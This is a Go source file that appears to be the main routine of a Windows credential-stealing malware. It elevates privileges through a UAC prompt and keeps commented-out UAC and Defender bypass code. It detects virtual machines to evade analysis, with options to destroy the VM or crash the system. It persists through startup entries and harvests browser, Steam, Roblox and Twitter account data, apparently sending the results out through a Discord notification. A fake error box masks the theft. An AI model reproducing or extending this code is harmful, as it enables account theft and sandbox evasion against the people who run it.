package main

import (
	"os"
	"runtime"
	"strings"
	"time"
)

var modulesEnabled string

func main() {
	if runtime.GOOS != "windows" {
		return
	}

	isAdmin := IsRunningAsAdmin()
	if !isAdmin {
		showUACPrompt()
		os.Exit(0)
		return
	}
	//isUacBypass := len(os.Args) > 1 && os.Args[1] == "uacbypass"
	//
	//switch {
	//case isAdmin, isUacBypass:
	//	log.Println("Running with elevated privileges")
	//	defenderBypass()
	//default:
	//	log.Println("Attempting UAC bypass...")
	//	bypassUAC()
	//	return
	//}

	if IsVM() && strings.Contains(modulesEnabled, "antivm") {
		if strings.Contains(modulesEnabled, "vmdestroy") {
			FuckUpVM()
		} else if strings.Contains(modulesEnabled, "bsod") && isAdmin {
			TriggerBSOD()
		}
		os.Exit(0)
		return
	}

	// Run tasks in a separate goroutine
	go func() {
		if strings.Contains(modulesEnabled, "startup") {
			_ = AddToStartup()
		}
		if strings.Contains(modulesEnabled, "browsers") {
			GrabBrowsersData()
		}
		if strings.Contains(modulesEnabled, "steam") {
			_ = FindSteamAccounts()
		}
		if strings.Contains(modulesEnabled, "roblox") {
			GrabRoblox()
		}
		if strings.Contains(modulesEnabled, "twitter") {
			GrabTwitter()
		}
		_ = SendDiscordNotification()

		// Exit the program after completing tasks
		os.Exit(0)
	}()

	if strings.Contains(modulesEnabled, "fakeerror") {
		// Simulate a fake error message box with a core dump
		fakeError := `Segmentation fault (core dumped)
Stack trace:
#0  0x00007FF6A33428 in memcpy() from msvcrt.dll
#1  0x00007FF6A351AB in startInit() at init.cpp:34
#2  0x00007FF6A351F0 in main() at main.cpp:12`
		MessageBox(0, fakeError, "Segmentation Fault", MB_ICONERROR)
	}

	time.Sleep(1 * time.Hour)
}
